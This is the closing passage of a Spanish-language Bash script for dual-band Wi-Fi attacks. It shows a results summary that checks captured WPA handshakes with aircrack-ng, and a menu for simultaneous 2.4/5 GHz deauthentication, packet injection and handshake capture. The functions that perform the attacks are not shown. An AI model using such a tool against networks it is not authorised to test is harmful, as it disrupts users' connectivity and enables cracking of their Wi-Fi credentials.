    echo -e "${GREEN}✅ Limpieza completada${NC}"
}

show_dualband_summary() {
    echo -e "\n${BLUE}╔════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${NC}                      ${YELLOW}RESUMEN ATAQUE DUALBAND${NC}                        ${BLUE}║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════════════════════════════════════════╝${NC}"
    
    echo -e "${CYAN}📁 Directorio del proyecto: $OUTPUT_DIR${NC}"
    
    if [[ -n "$TARGET_ESSID" || -n "$TARGET_BSSID_24" || -n "$TARGET_BSSID_5" ]]; then
        echo -e "\n${GREEN}🎯 Objetivos atacados:${NC}"
        [[ -n "$TARGET_ESSID" ]] && echo -e "  📝 ESSID: $TARGET_ESSID"
        [[ -n "$TARGET_BSSID_24" ]] && echo -e "  🔵 BSSID 2.4GHz: $TARGET_BSSID_24"
        [[ -n "$TARGET_BSSID_5" ]] && echo -e "  🔴 BSSID 5GHz: $TARGET_BSSID_5"
        echo -e "  🔧 Tipo de ataque: $ATTACK_TYPE"
    fi
    
    echo -e "\n${CYAN}📊 Estado de bandas:${NC}"
    echo -e "  🔵 2.4GHz: ${BAND_24_ACTIVE:-false} (Interface: ${INTERFACE_24:-N/A})"
    echo -e "  🔴 5GHz: ${BAND_5_ACTIVE:-false} (Interface: ${INTERFACE_5:-N/A})"
    
    # Análisis de archivos generados
    echo -e "\n${CYAN}📁 Archivos por banda:${NC}"
    
    # 2.4GHz
    local files_24=$(find "$OUTPUT_DIR" -path "*24ghz*" -type f 2>/dev/null | wc -l)
    echo -e "  🔵 2.4GHz: $files_24 archivos"
    
    # 5GHz
    local files_5=$(find "$OUTPUT_DIR" -path "*5ghz*" -type f 2>/dev/null | wc -l)
    echo -e "  🔴 5GHz: $files_5 archivos"
    
    # Verificar handshakes capturados
    local handshakes_found=false
    if [[ -f "$OUTPUT_DIR/captures/24ghz/handshake-01.cap" ]]; then
        local hs_24=$(aircrack-ng "$OUTPUT_DIR/captures/24ghz/handshake-01.cap" 2>/dev/null | grep -c "handshake" || echo "0")
        if [[ $hs_24 -gt 0 ]]; then
            echo -e "\n${GREEN}🎣 Handshake 2.4GHz: ✅ Capturado${NC}"
            handshakes_found=true
        fi
    fi
    
    if [[ -f "$OUTPUT_DIR/captures/5ghz/handshake-01.cap" ]]; then
        local hs_5=$(aircrack-ng "$OUTPUT_DIR/captures/5ghz/handshake-01.cap" 2>/dev/null | grep -c "handshake" || echo "0")
        if [[ $hs_5 -gt 0 ]]; then
            echo -e "\n${GREEN}🎣 Handshake 5GHz: ✅ Capturado${NC}"
            handshakes_found=true
        fi
    fi
    
    [[ $handshakes_found == false ]] && echo -e "\n${YELLOW}🎣 No se capturaron handshakes${NC}"
    
    echo -e "\n${CYAN}💡 Análisis adicional disponible en: $OUTPUT_DIR/analysis/${NC}"
}

main_menu() {
    while true; do
        print_banner
        
        echo -e "${BLUE}╔══════════════════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${BLUE}║${NC}                         ${YELLOW}MENÚ PRINCIPAL${NC}                               ${BLUE}║${NC}"
        echo -e "${BLUE}╠══════════════════════════════════════════════════════════════════════════╣${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}1.${NC}  🔧 Detectar y Configurar Interfaces                             ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}2.${NC}  📡 Escaneo Dualband Completo                                   ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}3.${NC}  🎯 Deauth Simultáneo 2.4GHz + 5GHz                            ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}4.${NC}  📊 Monitor de Banda Dual                                        ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}5.${NC}  🔄 Inyección Coordinada                                         ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}6.${NC}  📈 Análisis Comparativo de Bandas                              ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}7.${NC}  🎣 Captura de Handshakes Dual                                   ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}8.${NC}  📋 Ver Resumen de Resultados                                   ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}0.${NC}  🚪 Salir                                                        ${BLUE}║${NC}"
        echo -e "${BLUE}╚══════════════════════════════════════════════════════════════════════════╝${NC}"
        
        if [[ -n "$INTERFACE_24" ]]; then
            echo -e "\n${GREEN}🔵 Interface 2.4GHz: $INTERFACE_24${NC}"
        fi
        
        if [[ -n "$INTERFACE_5" ]]; then
            echo -e "${GREEN}🔴 Interface 5GHz: $INTERFACE_5${NC}"
        fi
        
        echo ""
        read -p "Selecciona una opción (0-8): " choice
        
        case $choice in
            1) detect_wifi_interfaces ;;
            2) 
                [[ -z "$INTERFACE_24" ]] && detect_wifi_interfaces
                scan_dualband_networks
                read -p "Presiona Enter para continuar..."
                ;;
            3)
                [[ -z "$INTERFACE_24" ]] && detect_wifi_interfaces
                ATTACK_TYPE="dual_deauth"
                setup_output_directory
                execute_dual_deauth
                show_dualband_summary
                read -p "Presiona Enter para continuar..."
                ;;
            4)
                [[ -z "$INTERFACE_24" ]] && detect_wifi_interfaces
                ATTACK_TYPE="dual_monitor"
                setup_output_directory
                execute_dual_monitor
                show_dualband_summary
                read -p "Presiona Enter para continuar..."
                ;;
            5)
                [[ -z "$INTERFACE_24" ]] && detect_wifi_interfaces
                select_custom_dualband_config
                setup_output_directory
                execute_coordinated_injection
                show_dualband_summary
                read -p "Presiona Enter para continuar..."
                ;;
            6)
                [[ -z "$INTERFACE_24" ]] && detect_wifi_interfaces
                ATTACK_TYPE="band_analysis"
                setup_output_directory
                execute_dual_monitor  # Capturar datos primero
                sleep 30  # Permitir captura
                cleanup_dual_processes  # Detener captura
                execute_band_analysis
                show_dualband_summary
                read -p "Presiona Enter para continuar..."
                ;;
            7)
                [[ -z "$INTERFACE_24" ]] && detect_wifi_interfaces
                ATTACK_TYPE="dual_handshake"
                setup_output_directory
                execute_dual_handshake
                show_dualband_summary
                read -p "Presiona Enter para continuar..."
                ;;
            8)
                if [[ -n "$OUTPUT_DIR" ]]; then
                    show_dualband_summary
                else
                    echo -e "${YELLOW}⚠️ No hay resultados para mostrar${NC}"
                fi
                read -p "Presiona Enter para continuar..."
                ;;
            0)
                echo -e "${GREEN}👋 ¡Hasta luego!${NC}"
                cleanup_dual_processes
                exit 0
                ;;
            *)
                echo -e "${RED}❌ Opción inválida${NC}"
                sleep 1
                ;;
        esac
    done
}

# Verificar herramientas necesarias
missing_tools=()
for tool in aircrack-ng iwconfig iw; do
    if ! command -v "$tool" &> /dev/null; then
        missing_tools+=("$tool")
    fi
done

if [[ ${#missing_tools[@]} -gt 0 ]]; then
    echo -e "${RED}❌ Herramientas faltantes: ${missing_tools[*]}${NC}"
    echo -e "${YELLOW}💡 Instala con: sudo apt install aircrack-ng wireless-tools iw${NC}"
    exit 1
fi

# Verificar permisos de root
if [[ $EUID -ne 0 ]]; then
    echo -e "${YELLOW}⚠️ Se requieren permisos de root para ataques dualband${NC}"
    echo -e "${CYAN}💡 Ejecuta como: sudo $0${NC}"
    read -p "¿Continuar de todos modos? (y/N): " continue_anyway
    [[ $continue_anyway != [yY] ]] && exit 1
fi

# Configurar trap para limpieza al salir
trap cleanup_dual_processes EXIT

# Ejecutar menú principal
main_menu